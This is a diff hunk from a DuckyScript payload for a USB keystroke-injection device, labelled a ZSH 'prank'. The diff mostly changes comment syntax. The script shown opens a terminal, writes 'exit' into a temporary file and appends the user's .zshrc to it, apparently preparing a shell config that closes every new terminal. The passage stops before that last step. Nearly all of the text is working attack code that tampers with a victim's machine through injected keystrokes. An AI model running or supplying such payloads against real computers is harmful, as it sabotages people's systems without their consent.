@@ -1,22 +1,22 @@
-* REM ###########################################################
-* REM #                                                         #
-* REM # Title       : This damn shell doesn't work, SO SAD! :C  #
-* REM # Author      : Aleff                                     #
-* REM # Version     : 1.0                                       #
-* REM # Category    : Prank                                     #
-* REM # Target      : ZSH Shell                                 #
-* REM #                                                         #
-* REM ###########################################################
+###########################################################
+#                                                         #
+# Title       : This damn shell doesn't work, SO SAD! :C  #
+# Author      : Aleff                                     #
+# Version     : 1.0                                       #
+# Category    : Prank                                     #
+# Target      : ZSH Shell                                 #
+#                                                         #
+###########################################################
 
 ATTACKMODE HID
 
-* REM Requirements:
-* REM     - Nothing <3
+# Requirements:
+#     - Nothing <3
 
 QUACK DELAY 1000
 QUACK CTRL-ALT t
 QUACK DELAY 2000
-QUACK STRING echo "exit" > .tmp
+QUACK STRING echo \"exit\" > .tmp
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING cat .zshrc >> .tmp
